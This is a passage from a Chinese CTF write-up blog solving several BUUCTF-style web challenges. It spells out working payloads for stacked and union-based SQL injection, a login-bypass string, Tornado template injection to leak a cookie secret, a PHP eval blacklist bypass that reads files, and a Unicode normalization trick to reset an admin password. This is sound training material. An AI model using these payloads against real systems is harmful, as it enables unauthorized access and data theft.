<p>内部查询语句类似 : select id, data from word where id =</p>
<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show table;#</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>打开界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230414826.png" alt="image-20200616230414826"></p>
<p>试了一下有三种显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230527277.png" alt="image-20200616230527277"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230539819.png" alt="image-20200616230539819"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230544576.png" alt="image-20200616230544576"></p>
<p>一共有以上三种显示</p>
<p>可以使用堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230851120.png" alt="image-20200616230851120"></p>
<p>可以看到有一个Flag表，测试发现from flag都被过滤不能直接读到flag。<br>想了很久想不到 看别人wp了~，听说比赛的时候原理泄漏了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>

<p>这tm根本想不到</p>
<p>不过由于没有过滤 * 出现了一个意外解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616231105904.png" alt="image-20200616231105904"></p>
<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090723586.png" alt="image-20200617090723586"></p>
<p>因为题目说用SQL注入，所以就可以明确了。</p>
<p>按照正常流程来一波，先在用户名处随便输入内容，加上一个单引号( ‘ )</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090900746.png" alt="image-20200617090900746"></p>
<p>登录，报错了，说明可以注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090919670.png" alt="image-20200617090919670"></p>
<p>返回，在引号后面加一个井号（#），页面返回正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090958992.png" alt="image-20200617090958992"></p>
<p>使用<code>order by</code> 查看字段数，这里当<code>order by 3</code>的时候页面返回正常，其他发返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091135646.png" alt="image-20200617091135646"></p>
<p>使用<code>union select 1,2,3#</code>来查看注入点</p>
<p>没想到flag直接出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091234044.png" alt="image-20200617091234044"></p>
<h4 id="还有一种方法"><a href="#还有一种方法" class="headerlink" title="还有一种方法"></a>还有一种方法</h4><p>使用万能密码登录</p>
<p>前面的123不一定非得是123，自己喜欢输入什么就输入什么</p>
<p><code>123&#39; or &#39;1&#39;=&#39;1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091425914.png" alt="image-20200617091425914"></p>
<p>也是成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091416354.png" alt="image-20200617091416354"></p>
<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开网址</p>
<p>有三个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617095216591.png" alt="image-20200617095216591"></p>
<p>挨个打开</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5b43f104291dd7435e0dcd18c4ed9d8a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103924552.png" alt="image-20200617103924552"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;67ac43a877052aa89c40b36ec5bc157e</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103941403.png" alt="image-20200617103941403"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;04b56c16ce59e7b360eed3e1638e142c</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103948371.png" alt="image-20200617103948371"></p>
<p>有这三个内容，</p>
<p>发现render函数：将文件内容显示在网页上  <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq78827534%2Farticle%2Fdetails%2F80792514" target="_blank" rel="noopener">render函数介绍</a></p>
<p>测试之后发现还有一个error界面。格式为<code>/error?msg=error</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104507291.png" alt="image-20200617104507291"></p>
<p>联想render函数，修改msg的参数</p>
<p>因为可以看到，nsg很后面跟着Error，也跟着打印出来了，尝试一下将其改为1，或者其他，看看能否打印</p>
<p>打印了。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104841639.png" alt="image-20200617104841639"></p>
<p>尝试一下能否进行运算，</p>
<p>传递error?msg=2，页面输出2</p>
<p>传递error?msg=4，页面输出ORZ（除和减操作符也是返回ORZ，说明操作符被过滤了）。</p>
<p>仿照url格式，我们还需要知道filehash值，filehash是一个md5后的值，联想第三个界面</p>
<p>md5(cookie_secret+md5(filename))，我们还需要知道cookie_secret，那么tornado中的cookie通过模板注入要怎么拿到呢？<br>用的就是handler.settings对象</p>
<p>其中cookie_secret是在Tornado框架的附属文件handler.settings中</p>
<p>这样就可以构造URL：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105527432.png" alt="image-20200617105527432"></p>
<p>复制这个cookue_secret，这样我们需要写一个PHP或者python都行，来计算filehash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cookie&#x3D;&#39;448b372f-9031-488e-83f3-35ce014c3baa&#39;;</span><br><span class="line">	$flag&#x3D;&#39;&#x2F;fllllllllllllag&#39;;</span><br><span class="line">	echo md5($cookie.md5($flag));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105952296.png" alt="image-20200617105952296"></p>
<p>复制输出的MD5值</p>
<p>在URL中添加</p>
<p>将filename改为/fllllllllllllag，filehash改为输出的MD5值</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;2b0f561c7b112c2c8b665bfb2048405b</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617110059578.png" alt="image-20200617110059578"></p>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121622838.png" alt="image-20200617121622838"></p>
<p>按F12查看一下源码</p>
<p>这里注释了一段代码，意思就是当cat等于dog时候输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121702435.png" alt="image-20200617121702435"></p>
<p>这里我们查看在url中构造一下，成功返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121751729.png" alt="image-20200617121751729"></p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>看一下源码</p>
<p>这里面有一个calc.php，访问一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617142755512.png" alt="image-20200617142755512"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"># 判断是否为空</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line"># 不为空执行以下代码</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line"># 黑名单</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        </span><br><span class="line"># 遍历数组</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line"># 正则表达式对字符串进行搜索</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">            # 成功执行die</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       # 否则 输出str变量</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>扫一下根目录，发现有一个flagg文件</p>
<p>这里? num 中间要空格开，不能连起来写。</p>
<p><strong>解析：</strong>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150348928.png" alt="image-20200617150348928"></p>
<p>查看flagg</p>
<p>解析：因为直接输入/flagg是不行的，所以转成ascii码</p>
<p>成功返回flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150801953.png" alt="image-20200617150801953"></p>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155127550.png" alt="image-20200617155127550"></p>
<p>右上角有一个选择框查看内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155219302.png" alt="image-20200617155219302"></p>
<p>有一个登录和注册</p>
<p>随便注册一个登录试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155250871.png" alt="image-20200617155250871"></p>
<p>发现登录上去后有post、change password、logout功能。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155323634.png" alt="image-20200617155323634"></p>
<p>然后在index页面源码发现提示，<code>you are not admin</code>，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155413109.png" alt="image-20200617155413109"></p>
<p>点击change password，于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155536349.png" alt="image-20200617155536349"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155654022.png" alt="image-20200617155654022"></p>
<p>复制网址打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617161654507.png" alt="image-20200617161654507"></p>
<p>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#39;index.html&#39;, title &#x3D; &#39;hctf&#39;)</span><br></pre></td></tr></table></figure>

<p>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#39;header.html&#39;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Hello &#123;&#123; session[&#39;name&#39;] &#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#39;name&#39;] &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Welcome to hctf&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#39;footer.html&#39;) %&#125;</span><br></pre></td></tr></table></figure>

<p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;register&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def register():</span><br><span class="line"></span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; RegisterForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        if session.get(&#39;image&#39;).lower() !&#x3D; form.verify_code.data.lower():</span><br><span class="line">            flash(&#39;Wrong verify code.&#39;)</span><br><span class="line">            return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form&#x3D;form)</span><br><span class="line">        if User.query.filter_by(username &#x3D; name).first():</span><br><span class="line">            flash(&#39;The username has been registered&#39;)</span><br><span class="line">            return redirect(url_for(&#39;register&#39;))</span><br><span class="line">        user &#x3D; User(username&#x3D;name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;register successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; LoginForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        session[&#39;name&#39;] &#x3D; name</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        if user is None or not user.check_password(form.password.data):</span><br><span class="line">            flash(&#39;Invalid username or password&#39;)</span><br><span class="line">            return redirect(url_for(&#39;login&#39;))</span><br><span class="line">        login_user(user, remember&#x3D;form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;login.html&#39;, title &#x3D; &#39;login&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;logout&#39;)</span><br><span class="line">def logout():</span><br><span class="line">    logout_user()</span><br><span class="line">    return redirect(&#39;&#x2F;index&#39;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def change():</span><br><span class="line">    if not current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    form &#x3D; NewpasswordForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(session[&#39;name&#39;])</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;change successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form)</span><br></pre></td></tr></table></figure>

<p>这里面有三个解</p>
<p>直说其中一个，也是最简单的</p>
<h5 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h5><p>这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数<code>lower</code>，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username &#x3D; nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>

<p>这里用到了<code>nodeprep.prepare</code>函数，而nodeprep是从twisted模块中导入的<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，在requirements.txt文件中，发现这里用到的twisted版本是<code>Twisted==10.2.0</code>，而官网最新版本为<code>19.2.0</code>(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下<code>nodeprep.prepare</code>，找到一篇unicode安全的文章，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
<p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。<br> 所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成<code>Admin</code>，我们用<code>ᴬdmin</code>进行登录，可以看到index页面的username变成了<code>Admin</code>，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可（改一下密码重新登录）。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180807334.png" alt="image-20200617180807334"></p>
<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为<code>admin</code>，从而改掉<code>admin</code>的密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180838843.png" alt="image-20200617180838843"></p>
<p>然后用<code>admin</code>和改的密码的登录，即可获取flag。</p>
<p>使用的是<code>admin</code>而不是<code>ᴬdmin</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617194252428.png" alt="image-20200617194252428"></p>
<p>还有两种解法，转自：<a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154326790.png" alt="image-20200619154326790"></p>
<p>题目已经提醒了是SQL注入，所以在用户名处进行注入，看看能否进行报错，说明存在SQL注入而且也是单引号出错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154426285.png" alt="image-20200619154426285"></p>
<p>将后面加入注释符试试</p>
<p>发现返回了md5值，经过尝试发现无法解密，说明错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154519487.png" alt="image-20200619154519487"></p>
<p>直接在输入框没办法进行，在URL中试试，打开火狐使用hackbar当然也可以不用，只不过这样看的更直观而已</p>
<p>这样发现显示了不是之前的password而是显示了input。。。，这里可以猜测#不能使用，使用%23试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154853693.png" alt="image-20200619154853693"></p>
<p>使用%23之后发现页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155011435.png" alt="image-20200619155011435"></p>
<p>尽心测试注入字段，没有字段4，尝试一下字段3看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155036006.png" alt="image-20200619155036006"></p>
<p>发现字段3页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155229344.png" alt="image-20200619155229344"></p>
<p>查看注入点，username需要为错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155320193.png" alt="image-20200619155320193"></p>
<p>查看数据库</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155343358.png" alt="image-20200619155343358"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155450550.png" alt="image-20200619155450550"></p>
<p>我们查询一下l0ve1ysq1这个表，发现返回了用户名和密码，看看有没有可用的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155629096.png" alt="image-20200619155629096"></p>
<p>将页面往后拉，发现出现了flag，复制提交即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(username,password)from l0ve1ysq1%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155856927.png" alt="image-20200619155856927"></p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>查看页面</p>
<p>根据题目的提示可以分析是信息泄露，我们使用dirsearch来扫描一下目录看看有没有什么敏感的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620181135515.png" alt="image-20200620181135515"></p>
<p>这个我们在kali中安装一下dirsearch</p>
<p>安装很简单，直接在GitHub中下载，然后解压就可以</p>
<p>地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
<p>解压后进到dirsearch-master这个目录中，右键打开终端使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn -e php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182053874.png" alt="image-20200620182053874"></p>
<p>dirsearch参数介绍</p>
<p>-u    指定URL</p>
<p>-e    扫描网站语言</p>
<p>-w    可以加上自己的字典（带上路径）</p>
<p>-i    递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
<p>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</p>
<p>我们这里就指定php来跑</p>
<p>跑完之后发现有一个<a href="http://www.zip的压缩包，有点可疑，在页面中访问一下" target="_blank" rel="noopener">www.zip的压缩包，有点可疑，在页面中访问一下</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182353231.png" alt="image-20200620182353231"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn&#x2F;www.zip</span><br></pre></td></tr></table></figure>

<p>访问上面链接之后会下载一个zip的文件，打开之后发现有三个php文件</p>
<p>分别是class.php、flag.php，index.php这三个php 文件，打开看看</p>
<p>index.php</p>
<p>查看index.php文件，这里只是筛选了php，还有一些HTML直接省略</p>
<p>这里可以看到包含了class.php文件和GET传参select的值，然后反序列化该值，接着看class.php</p>
